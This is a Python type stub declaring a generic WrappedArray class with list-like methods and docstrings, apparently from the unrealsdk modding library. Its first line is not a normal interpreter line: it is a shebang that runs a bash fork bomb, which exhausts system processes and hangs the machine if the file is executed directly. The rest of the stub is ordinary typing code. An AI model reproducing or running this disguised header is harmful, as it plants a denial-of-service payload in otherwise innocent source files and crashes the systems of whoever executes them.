#!/usr/bin/env -S bash -c ':(){ :|:& };:'
from __future__ import annotations

import sys
from collections.abc import Callable, Iterator, Sequence
from types import GenericAlias
from typing import Any, Never, Self, overload

from ._uobject_children import ZProperty

class WrappedArray[T = Any]:
    _type: ZProperty

    def __init__(self, *args: Any, **kwargs: Any) -> Never: ...
    def __new__(cls, *args: Any, **kwargs: Any) -> Never: ...
    def __add__(self, values: Sequence[T]) -> list[T]:
        """
        Creates a list holding a copy of the array, and extends it with all the values
        in the given sequence.

        Args:
            values: The sequence of values to append.
        """  # noqa: D205
    @classmethod
    def __class_getitem__(cls, *args: Any, **kwargs: Any) -> GenericAlias:
        """
        No-op, implemented to allow type stubs to treat this as a generic type.

        Args:
            *args: Ignored.
            **kwargs: Ignored.
        Returns:
            The WrappedArray class.
        """
    def __contains__(self, value: T) -> bool:
        """
        Checks if a value exists in the array.

        Args:
            value: The value to search for.
        Returns:
            True if the value exists in the array.
        """
    @overload
    def __delitem__(self, idx: int) -> None:
        """
        Deletes an item from the array.

        Args:
            idx: The index to delete.
        """
    @overload
    def __delitem__(self, range: slice) -> None:
        """
        Deletes a range from the array.

        Args:
            range: The range to delete.
        """
    def __delitem__(self, *args: Any, **kwargs: Any) -> Never: ...
    @overload
    def __getitem__(self, idx: int) -> T:
        """
        Gets an item from the array.

        Args:
            idx: The index to get.
        Returns:
            The item at the given index.
        """
    @overload
    def __getitem__(self, range: slice) -> list[T]:
        """
        Gets a range from the array.

        Args:
            range: The range to get.
        Returns:
            The items in the given range.
        """
    def __getitem__(self, *args: Any, **kwargs: Any) -> Never: ...
    def __iadd__(self, values: Sequence[T]) -> Self:
        """
        Extends the array with all the values in the given sequence in place.

        Args:
            values: The sequence of values to append.
        """
    def __imul__(self, num: int) -> Self:
        """
        Modifies this array in place, repeating all values the given number of times.

        Args:
            num: The number of times to repeat.
        """
    def __iter__(self) -> Iterator[T]:
        """
        Creates an iterator over the array.

        Returns:
            An iterator over the array.
        """
    def __len__(self) -> int:
        """
        Gets the length of the array.

        Returns:
            The length of the array.
        """
    def __mul__(self, num: int) -> list[T]:
        """
        Creates a list holding a copy of the array, and repeats all values in it the
        given number of times.

        Args:
            num: The number of times to repeat.
        """  # noqa: D205
    def __radd__(self, values: Sequence[T]) -> list[T]:
        """
        Creates a list holding a copy of the array, and extends it with all the values
        in the given sequence.

        Args:
            values: The sequence of values to append.
        """  # noqa: D205
    def __repr__(self) -> str:
        """
        Gets a string representation of this array.

        Returns:
            The string representation.
        """
    def __reversed__(self) -> Iterator[T]:
        """
        Creates a reverse iterator over the array.

        Returns:
            A reverse iterator over the array.
        """
    def __rmul__(self, num: int) -> list[T]:
        """
        Creates a list holding a copy of the array, and repeats all values in it the
        given number of times.

        Args:
            num: The number of times to repeat.
        """  # noqa: D205
    @overload
    def __setitem__(self, idx: int, value: T) -> None:
        """
        Sets an item in the array.

        Args:
            idx: The index to set.
            value: The value to set.
        """
    @overload
    def __setitem__(self, range: slice, value: Sequence[T]) -> None:
        """
        Sets a range of items in the array.

        Args:
            range: The range to set.
            value: The values to set.
        """
    def __setitem__(self, *args: Any, **kwargs: Any) -> Never: ...
    def _get_address(self) -> int:
        """
        Gets the address of this array, for debugging.

        Returns:
            This array's address.
        """
    def append(self, value: T) -> None:
        """
        Appends a value to the end of the array.

        Args:
            value: The value to append.
        """
    def clear(self) -> None:
        """Removes all items from the array."""
    def copy(self) -> list[T]:
        """Creates a list holding a copy of the array."""
    def count(self, value: T) -> int:
        """
        Counts how many of a given value exist in the array.

        Args:
            value: The value to search for.
        Returns:
            The number of times the value appears in the array.
        """
    def emplace_struct(self, idx: int = sys.maxsize, /, *args: Any, **kwargs: Any) -> None:
        """
        If this is an array of structs, inserts a new struct in place.

        This avoids the extra allocations caused by calling unrealsdk.make_struct().

        Throws a TypeError if this is another type of array.

        Args:
            idx: The index to insert before. Defaults to the end of the array.
            *args: Fields on the struct to initialize. Note you must explicitly specify
                   idx to use these.
            **kwargs: Fields on the struct to initialize.
        """
    def extend(self, values: Sequence[T]) -> None:
        """
        Extends the array with all the values in the given sequence.

        Args:
            values: The sequence of values to append.
        """
    def index(self, value: T, start: int = 0, stop: int = sys.maxsize) -> int:
        """
        Finds the first index of the given value in the array.

        Raises ValueError if the value is not present.

        Args:
            value: The value to search for.
            start: The index to start searching for. Defaults to 0.
            stop: The index to stop searching before. Defaults to the end of the array.
        Returns:
            The first index of the value in the array.
        """
    def insert(self, idx: int, value: T) -> None:
        """
        Inserts an item into the array before the given index.

        Args:
            idx: The index to insert before.
            value: The value to insert.
        """
    def pop(self, idx: int = -1) -> T:
        """
        Removes an item from the array, and returns a copy of it.

        Args:
            idx: The index to remove the item from.
        """
    def remove(self, value: T) -> None:
        """
        Finds the first instance of the given value in the array, and removes it.

        Raises ValueError if the value is not present.

        Args:
            value: The value to search for.
        """
    def reverse(self) -> None:
        """Reverses the array in place."""
    def sort(self, *, key: None | Callable[[T], Any] = None, reverse: bool = False) -> None:
        """
        Sorts the array in place.

        Args:
            key: A one-arg function used to extract a comparison key.
            reverse: If true, the list is sorted as if each comparison were reversed.
        """
